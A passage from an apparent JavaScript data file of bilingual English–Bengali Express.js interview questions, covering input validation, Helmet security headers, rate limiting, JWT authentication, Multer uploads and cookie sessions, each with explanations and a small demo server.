1. **Validation Rules**: Define validation check rules inside the route definition using middlewares like \`body()\`, \`query()\`, or \`param()\`.
2. **Sanitization**: Standardize values (e.g. \`trim()\`, \`normalizeEmail()\`, \`escape()\`).
3. **Error Reporting**: Read validation outcomes in your controller using \`validationResult(req)\`. If the result has errors, respond with a \`400 Bad Request\` containing details of the failed fields.

### Real-World Example
When registering a user, you must confirm that the email address is valid, the password is at least 6 characters, and the username is not empty. Using express-validator ensures invalid requests are rejected before hitting database queries.

### Best Practice
Always validate and sanitize all user input fields before querying the database. Create validation arrays as separate modular middleware arrays to keep controllers lightweight.

### Common Mistakes
Forgetting to call \`validationResult(req)\` inside the controller function. The validation checks run, but the request will proceed with invalid data unless you explicitly verify the error list and block the controller logic.

### Code Example
\`\`\`javascript
const express = require('express');
const { body, validationResult } = require('express-validator');
const app = express();

app.use(express.json());

// Validation middleware chain definition
const registrationValidation = [
  body('email').isEmail().withMessage('Enter a valid email').normalizeEmail(),
  body('password').isLength({ min: 6 }).withMessage('Password must be at least 6 characters').trim()
];

app.post('/api/register', registrationValidation, (req, res) => {
  // Inspect validation errors list
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ success: false, errors: errors.array() });
  }

  res.status(200).json({ success: true, message: 'Inputs validated successfully!' });
});

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
ইনপুট ভ্যালিডেশন ডাটাবেস ক্র্যাশ, ভুল ডাটা এন্ট্রি ও হ্যাকিং বা ইনজেকশন অ্যাটাক থেকে সার্ভারকে রক্ষা করে।
\`express-validator\` দিয়ে ভ্যালিডেশন চেইনের ধাপসমূহ:
১. **ভ্যালিডেশন রুল**: রাউট ডিক্লেয়ারেশনে মিডলওয়্যার হিসেবে \`body()\`, \`query()\` ইত্যাদি ব্যবহার করে নিয়মনীতি ঠিক করা হয়।
২. **স্যানিটাইজেশন**: ডাটা রি-ফরম্যাট ও পরিচ্ছন্ন করা (যেমন: \`trim()\` দিয়ে ফোর-ব্যাক স্পেস রিমুভ করা)।
৩. **এরর রিপোর্টিং**: কন্ট্রোলারের শুরুতে \`validationResult(req)\` কল করে এরর চেক করা হয়। এরর পাওয়া গেলে ৪০০ কোড দিয়ে ডিটেইলস ফেরত পাঠানো হয়।

### বাস্তব-ভিত্তিক উদাহরণ
ইউজার রেজিস্ট্রেশনের সময় ইমেইল সঠিক ফরম্যাটে আছে কিনা, পাসওয়ার্ড কমপক্ষে ৬ অক্ষরের কিনা তা চেক করতে এটি ব্যবহার করা হয়, যাতে ডাটাবেসে ভুল ডাটা সেভ না হয়।

### উত্তম অনুশীলন
ডাটাবেসে পাঠানোর আগে ইউজারের ইনপুট সর্বদা স্যানিটাইজ ও এস্কেপ (\`escape()\`) করুন। ভ্যালিডেশন রুলগুলোকে আলাদা মডিউলে মিডলওয়্যার হিসেবে সাজিয়ে রাখুন যাতে কন্ট্রোলার কোড হালকা থাকে।

### সাধারণ ভুলসমূহ
ভ্যালিডেশন রুলস সেট করে কন্ট্রোলারের ভেতরে \`validationResult(req)\` এর লিস্ট চেক করতে ভুলে যাওয়া। এর ফলে এরর পেলেও কন্ট্রোলার ভুল ডাটা নিয়েই কোয়েরি সম্পন্ন করে ফেলে।

### Code Example
\`\`\`javascript
const express = require('express');
const { body, validationResult } = require('express-validator');
const app = express();

app.use(express.json());

// ভ্যালিডেশন রুলস চেইন
const registrationValidation = [
  body('email').isEmail().withMessage('সঠিক ইমেইল ঠিকানা দিন').normalizeEmail(),
  body('password').isLength({ min: 6 }).withMessage('পাসওয়ার্ড কমপক্ষে ৬ অক্ষরের হতে হবে').trim()
];

app.post('/api/register', registrationValidation, (req, res) => {
  // ভ্যালিডেশন এরর রিড করা
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ success: false, errors: errors.array() });
  }

  res.status(200).json({ success: true, message: 'ইনপুট ভ্যালিডেশন সফল!' });
});

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-44',
    title: 'Explain Helmet middleware and how it secures HTTP headers in Express applications.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Security', 'HTTP Headers', 'Helmet'],
    enAnswer: 'Helmet is a security middleware for Express that sets various HTTP headers to secure applications from common vulnerabilities. It configures headers to prevent XSS, clickjacking, MIME-sniffing, and hides V8 engine signatures (X-Powered-By).',
    bnAnswer: 'Helmet হলো এক্সপ্রেসের একটি সিকিউরিটি মিডলওয়্যার যা অ্যাপ্লিকেশনে বিভিন্ন HTTP হেডার সেট করে কমন হ্যাকিং হ্যাকিং বা নিরাপত্তা হুমকি প্রতিরোধ করে। এটি XSS, ক্লিকজ্যাকিং, মাইম-স্নিফিং এবং এক্সপ্রেসের নিজস্ব সিগন্যাচার (X-Powered-By) হাইড করে।',
    enExplanation: `### Explanation
By default, Express exposes headers that disclose software versions, which hackers use to target known system exploits. Helmet sets or hides headers to lock down security:
1. **\`X-Powered-By\`**: Removed to hide the fact that the server runs Express/Node.js.
2. **\`Content-Security-Policy (CSP)\`**: Prevents Cross-Site Scripting (XSS) by restricting where scripts, styles, and assets can be loaded from.
3. **\`X-Frame-Options\`**: Prevents clickjacking by restricting the app from being embedded inside frames or iframes on other domains.
4. **\`Strict-Transport-Security (HSTS)\`**: Enforces secure HTTPS connections.
5. **\`X-Content-Type-Options\`**: Sets to \`nosniff\` to prevent browsers from interpreting files as different MIME types (avoiding executable script injection via upload text files).

### Real-World Example
Without Helmet, inspecting your API response headers in the browser reveals \`X-Powered-By: Express\`. Enabling Helmet hides this signature and adds strict browser-level security policies instantly.

### Best Practice
Mount \`helmet()\` at the very top of your middleware stack. For development setups that require calling assets from external domains, adjust the Content-Security-Policy (CSP) configurations inside Helmet option parameters instead of disabling the middleware entirely.

### Common Mistakes
Mounting Helmet below routes definition. Middlewares must be mounted at the top of the file so their security headers apply to all routing responses.

### Code Example
\`\`\`javascript
const express = require('express');
const helmet = require('helmet');
const app = express();

// 1. Mount Helmet with default security headers
app.use(helmet());

app.get('/api/data', (req, res) => {
  res.json({ message: 'HTTP Headers secured by Helmet' });
});

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
ডিফল্টভাবে এক্সপ্রেস রেসপন্সে কিছু হেডার পাঠায় যা সার্ভারের সফটওয়্যার ও সংস্করণ প্রকাশ করে দেয়, যার সুযোগ নিয়ে হ্যাকাররা আক্রমণ চালাতে পারে। হেলমেট হেডারগুলো অপ্টিমাইজ করে নিরাপত্তা নিশ্চিত করে:
১. **\`X-Powered-By\`**: এটি রিমুভ করে সার্ভার যে এক্সপ্রেসজেএস এ চলছে তা গোপন রাখে।
২. **\`Content-Security-Policy\`**: স্ক্রিপ্ট বা ফাইল ডাউনলোড সোর্স লিমিট করে সাইটকে XSS (Cross-Site Scripting) থেকে বাঁচায়।
৩. **\`X-Frame-Options\`**: সাইটটিকে অন্য কোনো সাইটের আইফ্রেমের (iframe) ভেতর লোড হওয়া বন্ধ করে ক্লিকজ্যাকিং প্রতিরোধ করে।
৪. **\`Strict-Transport-Security\`**: কেবল সিকিউরড এইচটিটিপিএস (HTTPS) কানেকশনই ব্যবহারের নীতি ব্রাউজারে প্রয়োগ করে।
৫. **\`X-Content-Type-Options\`**: এর মান \`nosniff\` সেট করে ব্রাউজারে আপলোড করা কন্টেন্টের রূপ পরিবর্তন হওয়া রোধ করে।

### বাস্তব-ভিত্তিক উদাহরণ
হেলমেট ছাড়া যেকোনো রিকোয়েস্ট পাঠালে ব্রাউজারে হেডার দেখা যায়: \`X-Powered-By: Express\`। হেলমেট অন করলে এই ইনফরমেশনটি হাইড হয়ে যায় এবং অন্যান্য সিকিউরিটি হেডার রেসপন্সে অ্যাড হয়।

### উত্তম অনুশীলন
অ্যাপের শুরুতেই \`app.use(helmet())\` মিডলওয়্যারটি মাউন্ট করুন। লোকাল ফ্রন্টএন্ডে ডেভেলপমেন্ট বা সিডিএন (CDN) ইমেজ ব্যবহারের জন্য সিএসপি নীতিতে কনফ্লিক্ট দেখা দিলে হেলমেটের অপশন প্যারামিটারে কাস্টম রুলস ডিক্লেয়ার করে দিন।

### সাধারণ ভুলসমূহ
রাউটের নিচে হেলমেট মিডলওয়্যার মাউন্ট করা। হেডার কনফিগার করতে এটি অবশ্যই ফাইলের সব রাউটের ওপরে লিখতে হবে।

### Code Example
\`\`\`javascript
const express = require('express');
const helmet = require('helmet');
const app = express();

// ১. হেলমেট মিডলওয়্যার ডিক্লেয়ার করা
app.use(helmet());

app.get('/api/data', (req, res) => {
  res.json({ message: 'এইচটিটিপি হেডার সুরক্ষিত করা হয়েছে' });
});

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-45',
    title: 'How do you implement API Rate Limiting in an Express application?',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Security', 'Rate Limiting', 'DDoS Prevention'],
    enAnswer: 'API Rate Limiting limits repeated requests to public APIs. In Express, this is commonly implemented using express-rate-limit middleware, which stores request counts based on client IP addresses and responds with HTTP status code 429 when limits are exceeded.',
    bnAnswer: 'এপিআই রেট লিমিটিং পাবলিক এপিআইতে মাত্রাতিরিক্ত রিকোয়েস্ট পাঠানো সীমাবদ্ধ করে। এক্সপ্রেসজেএস-এ এটি সাধারণত express-rate-limit মিডলওয়্যার দিয়ে ইমপ্লিমেন্ট করা হয়, যা ক্লায়েন্ট আইপির ওপর ভিত্তি করে রিকোয়েস্ট কাউন্ট করে এবং লিমিট পার হলে ৪২৯ কোড রিটার্ন করে।',
    enExplanation: `### Explanation
Rate limiting protects server infrastructure from Distributed Denial of Service (DDoS) attacks, brute-force login attempts, and API scraping:
1. **Window Duration**: Define a time frame (e.g. 15 minutes).
2. **Request Limit**: Define max allowed request count per IP inside the window (e.g., 100 requests).
3. **Response Headers**: Returns headers informing the client:
   - \`RateLimit-Limit\`: Max allowed requests.
   - \`RateLimit-Remaining\`: Remaining requests left in window.
   - \`RateLimit-Reset\`: Time left for reset.
4. **Exceeded Limit**: Returns status code \`429 Too Many Requests\`.

### Real-World Example
To prevent automated scripts from brute-forcing passwords on a login endpoint, you can attach a strict rate limiter allowing only 5 login attempts per IP address every 10 minutes.

### Best Practice
Use in-memory stores (\`express-rate-limit\` default) for small applications. For production servers with multiple load-balanced instances, use a Redis-backed store (like \`rate-limit-redis\`) so the request limits are shared globally across all server instances.

### Common Mistakes
Setting too low a rate limit on API endpoints that fetch assets dynamically (like image gallery sliders), causing valid users to get blocked when browsing the UI.

### Code Example
\`\`\`javascript
const express = require('express');
const rateLimit = require('express-rate-limit');
const app = express();

// Configure rate limiter
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per windowMs
  message: { error: 'Too many requests, please try again after 15 minutes.' },
  standardHeaders: true, // Return rate limit info in the \`RateLimit-*\` headers
  legacyHeaders: false, // Disable the \`X-RateLimit-*\` headers
});

// Apply rate limiter globally
app.use(limiter);

app.get('/api/resource', (req, res) => {
  res.json({ data: 'Protected resources' });
});

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
রেট লিমিটিং সার্ভারকে ডিডস (DDoS) অ্যাটাক, ব্রুট-ফোর্স পাসওয়ার্ড ট্রাই এবং অটোমেটেড ডাটা স্ক্র্যাপিং থেকে রক্ষা করে:
১. **উইন্ডো ডিউরেশন**: একটি নির্দিষ্ট সময়সীমা নির্ধারণ করা (যেমন: ১৫ মিনিট)।
২. **রিকোয়েস্ট লিমিট**: ওই সময়ের মধ্যে সর্বোচ্চ কতবার রিকোয়েস্ট পাঠানো যাবে (যেমন: ১০০ বার)।
৩. **রেসপন্স হেডার**: রেসপন্সের সাথে \`RateLimit-Remaining\` এর মতো প্যারামিটার পাঠিয়ে ক্লায়েন্টকে লিমিটের তথ্য জানিয়ে দেওয়া হয়।
৪. **লিমিট অতিক্রম**: লিমিট পার হলে এপিআই \`429 Too Many Requests\` স্ট্যাটাস কোড দেয়।

### বাস্তব-ভিত্তিক উদাহরণ
লগইন পেজে হ্যাকাররা যাতে কোনো রোবট দিয়ে অনবরত ভুল পাসওয়ার্ড ট্রাই করতে না পারে, সেজন্য লগইন এন্ডপয়েন্টে ১০ মিনিটে ৫বারের বেশি ট্রাই করলে আইপি ব্লক বা রেট লিমিট ব্লক দেওয়া হয়।

### উত্তম অনুশীলন
ছোট প্রজেক্টে ইন-মেমোরি স্টোর ঠিক আছে। তবে ক্লাউডে একাধিক সার্ভার রানিং থাকলে অবশ্যই রেডিস ব্যাকড স্টোর (\`rate-limit-redis\`) ব্যবহার করুন, যাতে সবগুলো সার্ভার ইনস্ট্যান্স শেয়ার্ড মেমোরি থেকে ইউজার আইপি কাউন্ট ট্র্যাপ করতে পারে।

### সাধারণ ভুলসমূহ
ডায়নামিক ইমেজ গ্যালারির মতো পেজগুলোতে খুব কম রেট লিমিট দিয়ে রাখা, ফলে ইউজার স্ক্রল করার সময় অনেক বেশি এপিআই রিকোয়েস্ট ফায়ার হওয়ায় সাধারণ ইউজারও ব্লক হয়ে যান।

### Code Example
\`\`\`javascript
const express = require('express');
const rateLimit = require('express-rate-limit');
const app = express();

// রেট লিমিটার কনফিগার করা
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // ১৫ মিনিট
  max: 100, // সর্বোচ্চ ১০০ বার রিকোয়েস্ট প্রতি ১৫ মিনিটে
  message: { error: 'অতিরিক্ত রিকোয়েস্ট পাঠানো হয়েছে, ১৫ মিনিট পর পুনরায় চেষ্টা করুন।' },
  standardHeaders: true, // হেডার স্ট্যান্ডার্ড অন করা
  legacyHeaders: false, 
});

// গ্লোবালি রেট লিমিটার অ্যাপ্লাই করা
app.use(limiter);

app.get('/api/resource', (req, res) => {
  res.json({ data: 'সুরক্ষিত এপিআই ডাটা' });
});

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-46',
    title: 'Explain JSON Web Token (JWT) Authentication workflow in Express.js.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Authentication', 'JWT', 'Security'],
    enAnswer: 'JWT Authentication is a stateless auth workflow. The client logs in, the server generates a cryptographically signed token (using jsonwebtoken) and returns it. The client stores it (e.g., in HttpOnly cookies) and sends it in the Authorization header for subsequent requests, which the server verifies using a middleware.',
    bnAnswer: 'JWT অথেনটিকেশন হলো একটি স্টেটলেস অথেনটিকেশন ফ্লো। ইউজার লগইন করলে সার্ভার একটি ক্রিপ্টোগ্রাফিক সিগনেচার যুক্ত টোকেন তৈরি করে পাঠায়। ক্লায়েন্ট তা কুকি বা লোকাল স্টোরেজে সংরক্ষণ করে এবং পরবর্তী রিকোয়েস্টের সময় Authorization হেডারে পাঠায় যা সার্ভার মিডলওয়্যার দিয়ে ভেরিফাই করে।',
    enExplanation: `### Explanation
Stateless authentication flow with JSON Web Tokens:
1. **User Login**: User submits credentials (username/password).
2. **Token Generation**: Server verifies credentials, signs a token using a private secret key containing non-sensitive payload details (e.g. user ID, role), and returns it to the client:
   - Method: \`jwt.sign(payload, secret, options)\`.
3. **Client Storage**: Client stores the token. Recommended storage is inside an \`HttpOnly\` secure cookie to prevent Cross-Site Scripting (XSS) access.
4. **Subsequent Requests**: Client sends the token in the \`Authorization: Bearer <token>\` HTTP header.
5. **Token Verification**: Server uses middleware to intercept the header and verify:
   - Method: \`jwt.verify(token, secret)\`. If verified, the parsed payload is attached to \`req.user\` and \`next()\` is called.

### Real-World Example
In microservices or highly scalable websites, JWT avoids session checks on database tables for every API call, since the token itself contains all verified permissions and metadata.

### Best Practice
Set short expiration times (e.g., 15 minutes) for access tokens and use a secure \`RefreshToken\` flow stored in database collections to renew them. Keep the JWT secret key strong and secure inside system environment files.

### Common Mistakes
Storing sensitive information (like user passwords or raw database keys) inside the JWT payload. The token payload is only base64-encoded, meaning *anyone* can decode it to view the plain text contents; only the signature verification checks require the secret key.

### Code Example
\`\`\`javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const app = express();

const JWT_SECRET = 'devprep-super-secret-key';
app.use(express.json());

// Auth check middleware
const verifyToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Bearer <token>

  if (!token) return res.status(401).json({ error: 'Token missing' });

  jwt.verify(token, JWT_SECRET, (err, decoded) => {
    if (err) return res.status(403).json({ error: 'Invalid or expired token' });
    req.user = decoded; // Mount decoded payload data
    next();
  });
};

app.get('/api/protected', verifyToken, (req, res) => {
  res.json({ message: 'Welcome authorized user', userId: req.user.id });
});

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
জেএসন ওয়েব টোকেন (JWT) এর কার্যপ্রবাহ:
১. **ইউজার লগইন**: ব্যবহারকারী ইমেইল ও পাসওয়ার্ড সাবমিট করেন।
২. **টোকেন তৈরি**: পাসওয়ার্ড সঠিক হলে সার্ভার একটি কাস্টম পে-লোড (ইউজার আইডি, রোল) নিয়ে সিক্রেট কী ব্যবহার করে টোকেন সিগনেচার জেনারেট করে:
   - মেথড: \`jwt.sign(payload, secret, options)\`।
৩. **সংরক্ষণ**: ক্লায়েন্ট টোকেনটি রিসিভ করে ব্রাউজারে স্টোর করে (নিরাপত্তার স্বার্থে \`HttpOnly\` কুকিতে রাখা ভালো)।
৪. **পরবর্তী রিকোয়েস্ট**: ক্লায়েন্ট প্রতিটি এপিআই রিকোয়েস্টের সময় Authorization হেডারে টোকেনটি পাঠায়।
৫. **ভেরিফিকেশন**: সার্ভার মিডলওয়্যারে \`jwt.verify()\` দিয়ে টোকেনটি যাচাই করে এবং সঠিক হলে ডিকোড করা ডাটা \`req.user\` অবজেক্টে সেট করে \`next()\` কল করে।

### বাস্তব-ভিত্তিক উদাহরণ
মাইক্রোসার্ভিস বা বড় কোডবেস সিস্টেমে প্রতিবার ডাটাবেসে ইউজার চেক করতে কুয়েরি করার ঝামেলা এড়াতে JWT ব্যবহার করা হয়, কারণ টোকেনের ভেতরেই ইউজারের সব ভেরিফাইড তথ্য উপস্থিত থাকে।

### উত্তম অনুশীলন
অ্যাক্সেস টোকেনের মেয়াদ সংক্ষিপ্ত রাখুন (যেমন ১৫ মিনিট) এবং নতুন টোকেন জেনারেট করতে ডাটাবেস-ভিত্তিক রিফ্রেশ টোকেন (RefreshToken) পদ্ধতি ব্যবহার করুন। টোকেন সিক্রেট কী শক্তিশালী ও ওএস মেমোরিতে রাখুন।

### সাধারণ ভুলসমূহ
টোকেন পে-লোডের ভেতরে ইউজারের পাসওয়ার্ড বা সংবেদনশীল তথ্য যুক্ত করা। টোকেনটি কেবল বেস-৬৪ (Base64) এনকোডেড থাকে, তাই সিক্রেট কী ছাড়াই যেকোনো ব্যক্তি পে-লোডটি ডিকোড করে প্লেইন টেক্সট দেখে নিতে পারে।

### Code Example
\`\`\`javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const app = express();

const JWT_SECRET = 'devprep-super-secret-key';
app.use(express.json());

// টোকেন যাচাইয়ের মিডলওয়্যার
const verifyToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Bearer <token>

  if (!token) return res.status(401).json({ error: 'টোকেন পাওয়া যায়নি' });

  jwt.verify(token, JWT_SECRET, (err, decoded) => {
    if (err) return res.status(403).json({ error: 'টোকেনটি মেয়াদোত্তীর্ণ বা ভুল' });
    req.user = decoded; 
    next();
  });
};

app.get('/api/protected', verifyToken, (req, res) => {
  res.json({ message: 'অথরাইজড রিকোয়েস্ট সফল', userId: req.user.id });
});

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-47',
    title: 'Explain file uploads in Express using Multer middleware.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'File Upload', 'Multer', 'Middleware'],
    enAnswer: 'Multer is a middleware for Express used for handling multipart/form-data, primarily used for uploading files. It parses incoming form files, exposes them on the req.file or req.files object, and saves them to local disk or memory.',
    bnAnswer: 'Multer হলো এক্সপ্রেসজেএস-এর একটি মিডলওয়্যার যা multipart/form-data প্রসেস করে ফাইল আপলোড করতে ব্যবহৃত হয়। এটি ইনকামিং ফাইল পার্স করে req.file বা req.files অবজেক্টে সেট করে এবং লোকাল মেমোরি বা ডিস্কে ফাইলটি সেভ করে।',
    enExplanation: `### Explanation
File uploads differ from JSON text submissions:
1. **Multipart Requests**: File transfers require the HTML form to have \`enctype="multipart/form-data"\`.
2. **Multer configuration**:
   - **Storage options**: \`diskStorage()\` (saves files directly to disk folders) vs \`memoryStorage()\` (buffers files in RAM as binary bytes, ideal for direct cloud uploads to S3/Cloudinary).
   - **Limits**: Configure maximum file sizes to protect disk space.
   - **File Filter**: Restrict uploaded files based on MIME types (e.g. only allow \`.jpg\` and \`.png\`).
3. **Usage**:
   - \`upload.single('fieldname')\`: Parses a single file, mounted to \`req.file\`.
   - \`upload.array('fieldname', maxCount)\`: Parses multiple files under one field name, mounted to \`req.files\`.

### Real-World Example
Uploading a profile image: A user selects an image and submits the form. Multer intercepts the multipart request, renames the file using a safe UUID, saves it inside a \`/uploads\` directory, and passes the path to the controller to save in the Database.

### Best Practice
Always validate file extensions and sizes on the server using Multer's \`fileFilter\` and \`limits\` options to block malicious executables (e.g. hackers uploading \`.sh\` or \`.js\` scripts to run on the server).

### Common Mistakes
Forgetting to specify the \`enctype="multipart/form-data"\` attribute in the HTML frontend form tag, causing Multer to ignore the request and fail to parse files.

### Code Example
\`\`\`javascript
const express = require('express');
const multer = require('multer');
const path = require('path');
const app = express();

// Configure storage location and file renaming
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, './uploads'); // Folder must exist
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

// Configure upload limits and filter
const upload = multer({
  storage: storage,
  limits: { fileSize: 2 * 1024 * 1024 }, // Max 2MB
  fileFilter: (req, file, cb) => {
    const allowedTypes = /jpeg|jpg|png/;
    const extName = allowedTypes.test(path.extname(file.originalname).toLowerCase());
    if (extName) {
      return cb(null, true);
    }
    cb(new Error('Only JPEG, JPG, and PNG images are allowed!'));
  }
});

// Single file upload endpoint
app.post('/api/upload-avatar', upload.single('avatar'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
  res.json({ message: 'Uploaded successfully', filepath: req.file.path });
});

// Error handling middleware to catch Multer limits errors
app.use((err, req, res, next) => {
  res.status(400).json({ error: err.message });
});

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
ফাইল আপলোড এবং টেক্সট পোস্টের আর্কিটেকচার সম্পূর্ণ ভিন্ন:
১. **মাল্টিপার্ট রিকোয়েস্ট**: ফাইল আপলোডের জন্য ফ্রন্টএন্ড ফর্ম ট্যাগে অবশ্যই \`enctype="multipart/form-data"\` অ্যাট্রিবিউট থাকতে হবে।
২. **মাল্টার কনফিগারেশন**:
   - **স্টোরেজ অপশন**: \`diskStorage()\` (সরাসরি হার্ডডিস্কের ফোল্ডারে ফাইল সেভ করে) এবং \`memoryStorage()\` (ফাইলটিকে বাফার ডাটা হিসেবে র‍্যামে রাখে, যা এডব্লিউএস বা ক্লাউডিনারি ক্লাউডে পাঠাতে উপযোগী)।
   - **লিমিট**: ফাইলের সর্বোচ্চ সাইজ লক করা।
   - **ফাইল ফিল্টার**: মাইম টাইপ ফিল্টার করে কাস্টম এক্সটেনশন ফিল্টার করা (যেমন শুধু ইমেজ এলাউ করা)।
৩. **মাউন্টিং**:
   - \`upload.single('name')\`: একটি ফাইল আপলোড করে \`req.file\`-এ জমা করে।
   - \`upload.array('name')\`: একাধিক ফাইল আপলোড করে \`req.files\`-এ জমা করে।

### বাস্তব-ভিত্তিক উদাহরণ
ইউজার প্রোফাইল পিকচার আপলোড করার পর মাল্টার রিকোয়েস্টটি ইন্টারসেপ্ট করে, ফাইলটির নাম রেন্ডমাইজ করে ইউনিক বানায় (যেমন ইউনিক আইডি দিয়ে), এটি \`/uploads\` ফোল্ডারে রাইট করে এবং ফাইলের উইন্ডোজ পাথটি ডাটাবেসে সেভ করার জন্য কন্ট্রোলারে পাঠায়।

### উত্তম অনুশীলন
সার্ভার সুরক্ষিত রাখতে মাল্টারের \`fileFilter\` এবং \`limits\` ব্যবহার করে ফাইল সাইজ এবং এক্সটেনশন কড়াকড়িভাবে ফিল্টার করুন। অন্যথায় হ্যাকাররা ওএস স্ক্রিপ্ট ফাইল (যেমন \`.sh\`, \`.exe\`) আপলোড করে আপনার ব্যাকএন্ডের নিয়ন্ত্রণ নিয়ে নিতে পারে।

### সাধারণ ভুলসমূহ
এইচটিএমএল ফর্মে \`enctype="multipart/form-data"\` না দেওয়া। এটি মিসিং হলে এক্সপ্রেস বডি ডাটা রিড করতে পারবে না এবং মাল্টার কোনো ফাইল ক্যাচ করবে না।

### Code Example
\`\`\`javascript
const express = require('express');
const multer = require('multer');
const path = require('path');
const app = express();

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, './uploads'); // ডিরেক্টরি পাথ
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({
  storage: storage,
  limits: { fileSize: 2 * 1024 * 1024 }, // সর্বোচ্চ ২ মেগাবাইট
  fileFilter: (req, file, cb) => {
    const allowedTypes = /jpeg|jpg|png/;
    const extName = allowedTypes.test(path.extname(file.originalname).toLowerCase());
    if (extName) {
      return cb(null, true);
    }
    cb(new Error('শুধু JPEG, JPG, এবং PNG ইমেজ ফাইল আপলোড করা যাবে!'));
  }
});

app.post('/api/upload-avatar', upload.single('avatar'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'কোনো ফাইল আপলোড করা হয়নি' });
  res.json({ message: 'সফলভাবে আপলোড হয়েছে', filepath: req.file.path });
});

app.use((err, req, res, next) => {
  res.status(400).json({ error: err.message });
});

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-48',
    title: 'Explain cookie-based Session management and session stores in Express.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Session Management', 'Cookies', 'Session Store'],
    enAnswer: 'Session management stores session data on the server side, identifying users via a cryptographically signed Session ID stored in a client-side browser cookie. Express uses express-session middleware and stores session data in memory or remote session stores like Redis.',
    bnAnswer: 'সেশন ম্যানেজমেন্ট সার্ভার সাইডে সেশন ডাটা সংরক্ষণ করে এবং ক্লায়েন্টের ব্রাউজার কুকিতে একটি সিকিউর সেশন আইডি (Session ID) বসিয়ে ইউজার চিহ্নিত করে। এক্সপ্রেসজেএস-এ এটি express-session মিডলওয়্যার এবং সেশন স্টোর (যেমন Redis) দিয়ে ইমপ্লিমেন্ট করা হয়।',
    enExplanation: `### Explanation
How stateful session management works:
1. **First Visit**: A client connects. Express generates a unique Session ID and attaches it to the client cookie: \`Set-Cookie: connect.sid=xxx\`.
2. **Server State**: The server allocates a data store object representing this Session ID.
3. **Subsequent Visits**: The browser automatically includes the \`connect.sid\` cookie. The middleware parses it, fetches the session details from the server store, and exposes them on \`req.session\`.
4. **Session Stores**:
   - **In-Memory Store (Default)**: Stores session data in server RAM. Causes memory leaks and loses session data when the server restarts or scales out.
   - **External Session Store (Redis, Connect-Mongo)**: Persists session data externally, allowing multiple server instances to access sessions concurrently.

### Real-World Example
In banking or shopping cart systems, user states, item lists, or wizard progress variables are stored inside \`req.session.cart\` on the server. If the user closes the tab and reopens it, their cart items are preserved via cookie matching.

### Best Practice
Configure session cookies with \`httpOnly: true\`, \`secure: true\` (only transmits over HTTPS), and \`sameSite: 'lax'\` to prevent CSRF and XSS attacks. Never use the default in-memory session store in production.

### Common Mistakes
Using default session parameters in production with multiple servers, which causes users to randomly log out when their request is routed to a different server instance that does not have their session cached in memory.

### Code Example
\`\`\`javascript
const express = require('express');
const session = require('express-session');
const app = express();

// Configure session middleware (using default memory store for demo only)
app.use(session({
  secret: 'devprep-keyboard-cat', // Secret key used to sign the session ID cookie
  resave: false,
  saveUninitialized: true,
  cookie: {
    secure: false, // Set to true in production over HTTPS
    httpOnly: true, // Prevents client-side JS from reading cookie
    maxAge: 60000 // 1 minute session duration
  }
}));

app.get('/api/session-view', (req, res) => {
  // Read and increment count variable in session
  if (!req.session.views) {
    req.session.views = 1;
  } else {
    req.session.views++;
  }
  res.json({ viewsCount: req.session.views });
});

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
স্টেটফুল সেশন ম্যানেজমেন্ট যেভাবে কাজ করে:
১. **প্রথম ভিজিট**: ইউজার পেজ ওপেন করলে সার্ভার একটি ইউনিক সেশন আইডি জেনারেট করে এবং ব্রাউজার কুকিতে সেট করে: \`Set-Cookie: connect.sid=xxx\`।
২. **সার্ভার সেশন মেমোরি**: সেশন আইডির বিপরীতে সার্ভার মেমোরিতে একটি ইউজার ডাটা অবজেক্ট তৈরি করা হয়।
৩. **পরবর্তী ভিজিট**: প্রতিবার এপিআই কলের সময় ব্রাউজার স্বয়ংক্রিয়ভাবে সেশন আইডির কুকি সাথে পাঠায়। সার্ভার কুকিটি ডিকোড করে ডাটাবেস বা সেশন স্টোর থেকে তথ্য এনে \`req.session\` অবজেক্টে সেট করে।
৪. **সেশন স্টোর**:
